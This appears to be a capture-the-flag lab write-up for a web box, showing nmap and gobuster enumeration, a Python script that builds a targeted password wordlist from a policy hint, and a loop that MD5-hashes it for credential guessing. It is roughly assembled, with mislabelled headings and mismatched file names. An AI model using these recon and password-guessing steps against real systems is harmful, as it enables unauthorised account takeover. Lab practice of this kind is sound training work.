
<h3>Nmap</h3>

```bash
nmap -sC -sV -Pn -p- -T5 TargetIP
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Marco's Blog
```

<h3>Nmap</h3>

```bash
gobuster dir -u http://pig.thm/admin/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -t 60 -e -k -x php,html,txt

http://pig.thm/admin/.htpasswd.html       (Status: 403) [Size: 272]
http://pig.thm/admin/.htpasswd.php        (Status: 403) [Size: 272]
http://pig.thm/admin/.htpasswd            (Status: 403) [Size: 272]
http://pig.thm/admin/.htaccess.php        (Status: 403) [Size: 272]
http://pig.thm/admin/.htaccess.txt        (Status: 403) [Size: 272]
http://pig.thm/admin/.htaccess.html       (Status: 403) [Size: 272]
http://pig.thm/admin/.htaccess            (Status: 403) [Size: 272]
http://pig.thm/admin/index.php            (Status: 302) [Size: 3158] [--> /login.php]
http://pig.thm/admin/includes.php         (Status: 200) [Size: 272]
http://pig.thm/admin/landing.php          (Status: 302) [Size: 445] [--> /login.php]
http://pig.thm/admin/resetpassword.php    (Status: 302) [Size: 2008] [--> /login.php]
```

```bash
gobuster dir -u http://pig.thm/admin/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 60 -e -k -x php,html,txt
...
http://pig.thm/admin/.html                (Status: 403) [Size: 272]
http://pig.thm/admin/.php                 (Status: 403) [Size: 272]
http://pig.thm/admin/index.php            (Status: 302) [Size: 3158] [--> /login.php]
http://pig.thm/admin/includes.php         (Status: 200) [Size: 272]
http://pig.thm/admin/landing.php          (Status: 302) [Size: 445] [--> /login.php]
http://pig.thm/admin/commands.php         (Status: 302) [Size: 857] [--> /login.php]
http://pig.thm/admin/adduser.php          (Status: 302) [Size: 2084] [--> /login.php]
http://pig.thm/admin/resetpassword.php    (Status: 302) [Size: 2008] [--
```

<h3>/index.html</h3>

<img width="1048" height="390" alt="image" src="https://github.com/user-attachments/assets/b3b625b7-3594-4b9d-8597-3d9e3a2d2404" />


<h3.</h3>

<img width="1032" height="311" alt="image" src="https://github.com/user-attachments/assets/58b23987-f73c-48e4-9330-daf4990971f7" />

```bash
Remember that passwords should be a memorable word, followed by two numbers and a special character
```

<img width="934" height="233" alt="image" src="https://github.com/user-attachments/assets/5bef4268-f864-4012-b4cc-6b4a7410aa81" />

<img width="947" height="286" alt="image" src="https://github.com/user-attachments/assets/35820a65-b52d-4190-a672-f8a602249e62" />


<h3>/admin/resetpassword.php</h3>


<img width="1096" height="365" alt="image" src="https://github.com/user-attachments/assets/2e983075-3f19-49da-b79a-60e8c05014fc" />



<h3>/login.php & admin:admin</h3>

<img width="1094" height="227" alt="image" src="https://github.com/user-attachments/assets/1ca72c34-5803-42a5-8af8-61216b28b1ef" />

```bash
memorableWords = ['Italy', 'italy', 'Milan', 'milan', 'Savoia', 'savoia',
                  'Curtiss', 'curtiss', 'Curtis', 'curtis', 'planes', 'Planes',
                  'Plane', 'plane']
specialChars = ['!','@','#','$']
count = 0

for word in memorableWords:
    for specialChar in specialChars:
        while (count <= 99):
            if (count <= 9):
                count = '0' + str(count)
            else:
                count = str(count)
            print(word + count + specialChar)
            count = int(count)
            count += 1
        count = 0
```

```bash
python memorable.py > wordlist.txt
```

```bash
tail wordlist.txt
plane90$
plane91$
plane92$
plane93$
plane94$
plane95$
plane96$
plane97$
plane98$
plane99$
```

```bash
while read -r line; do printf %s "$line" | md5sum | cut -f1 -d' '; done < passwords_generated.lst | tee -a passwords_hashed.lst
```

```bash
tail hashed_passwords
9a6216dcf0a945a1f70fb7dd2aa10b36
41fb768d68788990c0b73e72733ed1aa
5b127e461341cabb165444342245bae6
60c0d7fd1069d09821161fb7fc51376d
342d5765ac9c87a39323d67e662fe9cd
cd9170ba05edab80fc067639ed64f320
d727a859382cfc4263c5d6ec9f8e6b7c
b6ebbbe33a4580cca6c870c770fa36c4
6375c114ae25223dd775f057d5a130ec
89d6fc4ce85359185258f8b6aecd9a92
```



444


<img width="1046" height="432" alt="image" src="https://github.com/user-attachments/assets/06b7e18f-21ea-4445-8ffd-e2935fb2b03b" />

<img width="1033" height="409" alt="image" src="https://github.com/user-attachments/assets/ab322a15-dde8-4990-86ca-b0e57652efd9" />


